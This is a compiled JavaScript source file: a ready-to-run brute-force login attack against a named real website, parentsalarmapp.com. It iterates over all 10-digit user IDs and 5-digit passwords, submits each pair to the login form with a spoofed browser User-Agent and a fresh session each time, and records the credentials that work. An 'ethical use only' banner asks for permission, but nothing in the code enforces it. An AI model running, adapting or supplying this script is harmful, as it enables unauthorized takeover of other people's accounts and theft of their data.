"use strict";
var __importDefault = (this && this.__importDefault) || function (mod) {
    return (mod && mod.__esModule) ? mod : { "default": mod };
};
Object.defineProperty(exports, "__esModule", { value: true });
const axios_1 = __importDefault(require("axios"));
// Configuration
const BASE_URL = "https://parentsalarmapp.com";
const LOGIN_URL = `${BASE_URL}/`;
const USER_FIELD = "LoginId";
const PASS_FIELD = "LoginPassword";
const SUBMIT_FIELD = "command";
const SUBMIT_VALUE = "SIGN IN";
const TIMEOUT = 15000; // 15 seconds
const REQUEST_DELAY = 200; // 0.2 seconds
const MAX_RETRIES = 3;
// ID and Password ranges
const ID_START = 1000000000;
const ID_END = 9999999999; // All 10-digit IDs
const PASS_START = 11111;
const PASS_END = 99999; // All 5-digit passwords
class CredentialTester {
    constructor() {
        this.foundCredentials = [];
        this.totalTested = 0;
        this.axiosInstance = axios_1.default.create({
            timeout: TIMEOUT,
            headers: {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            },
            maxRedirects: 5,
            validateStatus: () => true, // Accept all status codes
        });
    }
    async sleep(ms) {
        return new Promise(resolve => setTimeout(resolve, ms));
    }
    async attemptLogin(userId, password) {
        for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
            try {
                // Get login page to refresh session
                await this.axiosInstance.get(LOGIN_URL);
                // Prepare payload
                const payload = new URLSearchParams({
                    [USER_FIELD]: userId,
                    [PASS_FIELD]: password,
                    [SUBMIT_FIELD]: SUBMIT_VALUE
                });
                // Send login request
                const response = await this.axiosInstance.post(LOGIN_URL, payload, {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }
                });
                // Check for successful login by looking at the final URL
                if (response.request?.res?.responseUrl?.includes('mobiledashboard') ||
                    response.config?.url?.includes('mobiledashboard')) {
                    return true;
                }
                // Also check response data for success indicators
                if (response.data && typeof response.data === 'string') {
                    if (response.data.includes('mobiledashboard') ||
                        response.data.includes('dashboard') ||
                        response.status === 200 && !response.data.includes('login')) {
                        return true;
                    }
                }
                return false;
            }
            catch (error) {
                if (attempt < MAX_RETRIES - 1) {
                    console.log(`Retry ${attempt + 1}/${MAX_RETRIES} after error: ${error.message}`);
                    await this.sleep(REQUEST_DELAY * 2);
                }
                else {
                    console.log(`Network error: ${error.message}`);
                    return false;
                }
            }
        }
        return false;
    }
    formatNumber(num) {
        return num.toLocaleString();
    }
    async run() {
        console.log(`Starting comprehensive ID and password test`);
        console.log(`Testing ${this.formatNumber(ID_END - ID_START + 1)} user IDs`);
        console.log(`Testing ${this.formatNumber(PASS_END - PASS_START + 1)} passwords per ID`);
        const totalCombinations = (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1);
        console.log(`Total combinations: ${this.formatNumber(totalCombinations)}`);
        console.log(`Estimated time: ${(totalCombinations * REQUEST_DELAY / 3600000).toFixed(2)} hours`);
        console.log("=".repeat(60));
        for (let userId = ID_START; userId <= ID_END; userId++) {
            const userIdStr = userId.toString();
            let userFound = false;
            console.log(`Testing User ID: ${userIdStr}`);
            for (let password = PASS_START; password <= PASS_END; password++) {
                const passwordStr = password.toString().padStart(5, '0');
                // Clear cookies for each attempt (axios doesn't have direct cookie clearing)
                // We'll create a new instance for each attempt to ensure clean state
                const freshInstance = axios_1.default.create({
                    timeout: TIMEOUT,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                        'Accept-Language': 'en-US,en;q=0.5',
                        'Connection': 'keep-alive',
                        'Upgrade-Insecure-Requests': '1',
                    },
                    maxRedirects: 5,
                    validateStatus: () => true,
                });
                // Attempt login with fresh instance
                const success = await this.attemptLoginWithInstance(freshInstance, userIdStr, passwordStr);
                this.totalTested++;
                if (success) {
                    this.foundCredentials.push({ userId: userIdStr, password: passwordStr });
                    console.log(`SUCCESS - User ID: ${userIdStr}, Password: ${passwordStr}`);
                    userFound = true;
                    break;
                }
                else {
                    // Only show failed attempts for the first few passwords to reduce noise
                    if (password <= PASS_START + 2) {
                        console.log(`   Password: ${passwordStr} - FAILED`);
                    }
                }
                // Respect rate limit
                await this.sleep(REQUEST_DELAY);
                // Progress update every 500 combinations
                if (this.totalTested % 500 === 0) {
                    console.log(`Progress: ${this.formatNumber(this.totalTested)}/${this.formatNumber(totalCombinations)} combinations tested`);
                    if (this.foundCredentials.length > 0) {
                        console.log(`Found so far: ${this.foundCredentials.length} valid credentials`);
                    }
                }
            }
            // If no password found for this user ID, show brief message
            if (!userFound) {
                console.log(`   No valid password for User ID: ${userIdStr}`);
            }
            // Break early if we want to stop after finding some credentials
            // Remove or modify this condition as needed
            if (this.foundCredentials.length >= 5) { // Stop after finding 5 valid credentials
                console.log("Stopping early - found 5 valid credentials");
                break;
            }
        }
        this.printResults();
    }
    async attemptLoginWithInstance(instance, userId, password) {
        for (let attempt = 0; attempt < MAX_RETRIES; attempt++) {
            try {
                // Get login page to refresh session
                await instance.get(LOGIN_URL);
                // Prepare payload
                const payload = new URLSearchParams({
                    [USER_FIELD]: userId,
                    [PASS_FIELD]: password,
                    [SUBMIT_FIELD]: SUBMIT_VALUE
                });
                // Send login request
                const response = await instance.post(LOGIN_URL, payload, {
                    headers: {
                        'Content-Type': 'application/x-www-form-urlencoded',
                    }
                });
                // Check for successful login by looking at the final URL
                if (response.request?.res?.responseUrl?.includes('mobiledashboard') ||
                    response.config?.url?.includes('mobiledashboard')) {
                    return true;
                }
                // Also check response data for success indicators
                if (response.data && typeof response.data === 'string') {
                    if (response.data.includes('mobiledashboard') ||
                        response.data.includes('dashboard') ||
                        (response.status === 200 && !response.data.includes('login'))) {
                        return true;
                    }
                }
                return false;
            }
            catch (error) {
                if (attempt < MAX_RETRIES - 1) {
                    console.log(`Retry ${attempt + 1}/${MAX_RETRIES} after error: ${error.message}`);
                    await this.sleep(REQUEST_DELAY * 2);
                }
                else {
                    console.log(`Network error: ${error.message}`);
                    return false;
                }
            }
        }
        return false;
    }
    printResults() {
        console.log("=".repeat(60));
        console.log("TEST COMPLETED");
        console.log(`Total combinations tested: ${this.formatNumber(this.totalTested)}`);
        console.log(`Valid credentials found: ${this.foundCredentials.length}`);
        if (this.foundCredentials.length > 0) {
            console.log("\nVALID CREDENTIALS:");
            this.foundCredentials.forEach(({ userId, password }) => {
                console.log(`   User ID: ${userId}, Password: ${password}`);
            });
        }
        else {
            console.log("No valid credentials found");
        }
        console.log("=".repeat(60));
    }
}
async function showWarning() {
    console.log("=".repeat(60));
    console.log("CREDENTIAL TESTING SCRIPT - ETHICAL USE ONLY");
    console.log(`Target: ${BASE_URL}`);
    console.log("=".repeat(60));
    console.log("Requirements:");
    console.log("- You MUST have explicit permission to test this site");
    console.log("- Respect server resources (use adequate delays)");
    console.log("- This is a comprehensive test - consider the massive scale");
    console.log("=".repeat(60));
    // Warning about scale
    const totalCombinations = (ID_END - ID_START + 1) * (PASS_END - PASS_START + 1);
    const estimatedHours = totalCombinations * 0.2 / 3600;
    console.log(`SCALE WARNING:`);
    console.log(`   Total combinations: ${totalCombinations.toLocaleString()}`);
    console.log(`   Estimated time: ${estimatedHours.toFixed(2)} hours (${(estimatedHours / 24).toFixed(2)} days)`);
    console.log("=".repeat(60));
    console.log("Starting test in 3 seconds...");
    await new Promise(resolve => setTimeout(resolve, 3000));
}
async function main() {
    await showWarning();
    const tester = new CredentialTester();
    await tester.run();
}
// Run the main function
if (require.main === module) {
    main().catch(console.error);
}
//# sourceMappingURL=main.js.map